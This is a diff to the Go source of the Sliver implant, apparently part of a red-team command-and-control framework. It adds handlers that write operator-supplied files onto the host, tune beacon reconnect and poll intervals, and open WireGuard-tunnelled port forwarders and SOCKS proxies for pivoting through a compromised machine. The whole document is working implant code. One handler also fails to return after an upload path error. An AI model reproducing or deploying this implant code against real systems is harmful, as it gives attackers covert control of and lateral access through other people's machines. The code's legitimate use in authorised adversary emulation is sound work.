@@ -28,6 +28,7 @@ import (
 	"io/ioutil"
 	"os/exec"
 	"strings"
+	"time"
 
 	// {{if .Config.Debug}}
 	"log"
@@ -36,6 +37,9 @@ import (
 	"os"
 	"path/filepath"
 
+	// {{if .Config.WGc2Enabled}}
+	"github.com/bishopfox/sliver/implant/sliver/forwarder"
+	// {{end}}
 	"github.com/bishopfox/sliver/implant/sliver/transports"
 	"github.com/bishopfox/sliver/protobuf/commonpb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
@@ -306,8 +310,17 @@ func uploadHandler(data []byte, resp RPCResponse) {
 		return
 	}
 
-	uploadPath, _ := filepath.Abs(uploadReq.Path)
+	uploadPath, err := filepath.Abs(uploadReq.Path)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("upload path error: %v", err)
+		// {{end}}
+		resp([]byte{}, err)
+	}
+
+	// Process Upload
 	upload := &sliverpb.Upload{Path: uploadPath}
+
 	f, err := os.Create(uploadPath)
 	if err != nil {
 		upload.Response = &commonpb.Response{
@@ -315,14 +328,22 @@ func uploadHandler(data []byte, resp RPCResponse) {
 		}
 
 	} else {
+		// Create file, write data to file system
 		defer f.Close()
-		data, err := gzipRead(uploadReq.Data)
+		var uploadData []byte
+		var err error
+		if uploadReq.Encoder == "gzip" {
+			uploadData, err = gzipRead(uploadReq.Data)
+		} else {
+			uploadData = uploadReq.Data
+		}
+		// Check for decode errors
 		if err != nil {
 			upload.Response = &commonpb.Response{
 				Err: fmt.Sprintf("%v", err),
 			}
 		} else {
-			f.Write(data)
+			f.Write(uploadData)
 		}
 	}
 
@@ -428,6 +449,200 @@ func setEnvHandler(data []byte, resp RPCResponse) {
 	resp(data, err)
 }
 
+func reconnectIntervalHandler(data []byte, resp RPCResponse) {
+	reconnectIntervalReq := &sliverpb.ReconnectIntervalReq{}
+	err := proto.Unmarshal(data, reconnectIntervalReq)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("error decoding message: %v\n", err)
+		// {{end}}
+		return
+	}
+
+	reconnectInterval := reconnectIntervalReq.GetReconnectIntervalSeconds()
+	// {{if .Config.Debug}}
+	log.Printf("Update reconnect interval called: %d\n", reconnectInterval)
+	// {{end}}
+
+	// Set the reconnect interval value
+	transports.SetReconnectInterval(time.Duration(reconnectInterval) * time.Second)
+
+	recIntervalResp := &sliverpb.ReconnectInterval{}
+	recIntervalResp.Response = &commonpb.Response{}
+	if err != nil {
+		recIntervalResp.Response.Err = err.Error()
+	}
+
+	data, err = proto.Marshal(recIntervalResp)
+	resp(data, err)
+}
+
+func pollIntervalHandler(data []byte, resp RPCResponse) {
+	pollIntervalReq := &sliverpb.PollIntervalReq{}
+	err := proto.Unmarshal(data, pollIntervalReq)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("error decoding message: %v\n", err)
+		// {{end}}
+		return
+	}
+
+	pollInterval := pollIntervalReq.GetPollIntervalSeconds()
+	// {{if .Config.Debug}}
+	log.Printf("Update poll interval called: %d\n", pollInterval)
+	// {{end}}
+
+	// Set the reconnect interval value
+	transports.SetPollInterval(time.Duration(pollInterval) * time.Second)
+
+	pollIntervalResp := &sliverpb.PollInterval{}
+	pollIntervalResp.Response = &commonpb.Response{}
+	if err != nil {
+		pollIntervalResp.Response.Err = err.Error()
+	}
+
+	data, err = proto.Marshal(pollIntervalResp)
+	resp(data, err)
+}
+
+// {{if .Config.WGc2Enabled}}
+
+func wgListTCPForwardersHandler(_ []byte, resp RPCResponse) {
+	fwders := forwarder.GetTCPForwarders()
+	listResp := &sliverpb.WGTCPForwarders{}
+	fwdList := make([]*sliverpb.WGTCPForwarder, 0)
+	for _, f := range fwders {
+		fwdList = append(fwdList, &sliverpb.WGTCPForwarder{
+			ID:         int32(f.ID),
+			LocalAddr:  f.LocalAddr(),
+			RemoteAddr: f.RemoteAddr(),
+		})
+	}
+	listResp.Forwarders = fwdList
+	data, err := proto.Marshal(listResp)
+	resp(data, err)
+}
+
+func wgStartPortfwdHandler(data []byte, resp RPCResponse) {
+	fwdReq := &sliverpb.WGPortForwardStartReq{}
+	err := proto.Unmarshal(data, fwdReq)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("error decoding message: %v\n", err)
+		// {{end}}
+		return
+	}
+
+	fwder := forwarder.NewWGTCPForwarder(fwdReq.RemoteAddress, transports.GetTUNAddress(), int(fwdReq.LocalPort), transports.GetTNet())
+	go fwder.Start()
+	fwdResp := &sliverpb.WGPortForward{
+		Response: &commonpb.Response{},
+		Forwarder: &sliverpb.WGTCPForwarder{
+			ID:         int32(fwder.ID),
+			LocalAddr:  fwder.LocalAddr(),
+			RemoteAddr: fwder.RemoteAddr(),
+		},
+	}
+	if err != nil {
+		fwdResp.Response.Err = err.Error()
+	}
+	data, err = proto.Marshal(fwdResp)
+	resp(data, err)
+}
+
+func wgStopPortfwdHandler(data []byte, resp RPCResponse) {
+	stopReq := &sliverpb.WGPortForwardStopReq{}
+	err := proto.Unmarshal(data, stopReq)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("error decoding message: %v\n", err)
+		// {{end}}
+		return
+	}
+	stopResp := &sliverpb.WGPortForward{
+		Response: &commonpb.Response{},
+	}
+	fwd := forwarder.GetTCPForwarder(int(stopReq.ID))
+	if fwd == nil {
+		stopResp.Response.Err = fmt.Sprintf("no forwarder found for id %d", stopReq.ID)
+	} else {
+		stopResp.Forwarder = &sliverpb.WGTCPForwarder{
+			ID:         int32(fwd.ID),
+			LocalAddr:  fwd.LocalAddr(),
+			RemoteAddr: fwd.RemoteAddr(),
+		}
+		fwd.Stop()
+		forwarder.RemoveTCPForwarder(fwd.ID)
+	}
+	data, err = proto.Marshal(stopResp)
+	resp(data, err)
+}
+
+func wgListSocksServersHandler(data []byte, resp RPCResponse) {
+	socksServers := forwarder.GetSocksServers()
+	listResp := &sliverpb.WGSocksServers{}
+	serverList := make([]*sliverpb.WGSocksServer, 0)
+	for _, s := range socksServers {
+		serverList = append(serverList, &sliverpb.WGSocksServer{
+			ID:        int32(s.ID),
+			LocalAddr: s.LocalAddr(),
+		})
+	}
+	listResp.Servers = serverList
+	data, err := proto.Marshal(listResp)
+	resp(data, err)
+}
+
+func wgStartSocksHandler(data []byte, resp RPCResponse) {
+	startReq := &sliverpb.WGSocksStartReq{}
+	err := proto.Unmarshal(data, startReq)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("error decoding message: %v\n", err)
+		// {{end}}
+		return
+	}
+	server := forwarder.NewWGSocksServer(int(startReq.Port), transports.GetTUNAddress(), transports.GetTNet())
+	go server.Start()
+	startResp := &sliverpb.WGSocks{
+		Response: &commonpb.Response{},
+		Server: &sliverpb.WGSocksServer{
+			ID:        int32(server.ID),
+			LocalAddr: server.LocalAddr(),
+		},
+	}
+	data, err = proto.Marshal(startResp)
+	resp(data, err)
+}
+func wgStopSocksHandler(data []byte, resp RPCResponse) {
+	stopReq := &sliverpb.WGSocksStopReq{}
+	err := proto.Unmarshal(data, stopReq)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("error decoding message: %v\n", err)
+		// {{end}}
+		return
+	}
+	server := forwarder.GetSocksServer(int(stopReq.ID))
+	stopResp := &sliverpb.WGSocks{
+		Response: &commonpb.Response{},
+	}
+	if server == nil {
+		stopResp.Response.Err = fmt.Sprintf("no server found for id %d", stopReq.ID)
+	} else {
+		stopResp.Server = &sliverpb.WGSocksServer{
+			ID:        int32(server.ID),
+			LocalAddr: server.LocalAddr(),
+		}
+		server.Stop()
+		forwarder.RemoveSocksServer(server.ID)
+	}
+	data, err = proto.Marshal(stopResp)
+	resp(data, err)
+}
+
+// {{end}}
+
 // ---------------- Data Encoders ----------------
 
 func gzipWrite(w io.Writer, data []byte) error {
@@ -439,9 +654,12 @@ func gzipWrite(w io.Writer, data []byte) error {
 
 func gzipRead(data []byte) ([]byte, error) {
 	bytes.NewReader(data)
-	reader, _ := gzip.NewReader(bytes.NewReader(data))
+	reader, err := gzip.NewReader(bytes.NewReader(data))
+	if err != nil {
+		return nil, err
+	}
 	var buf bytes.Buffer
-	_, err := buf.ReadFrom(reader)
+	_, err = buf.ReadFrom(reader)
 	if err != nil {
 		return nil, err
 	}
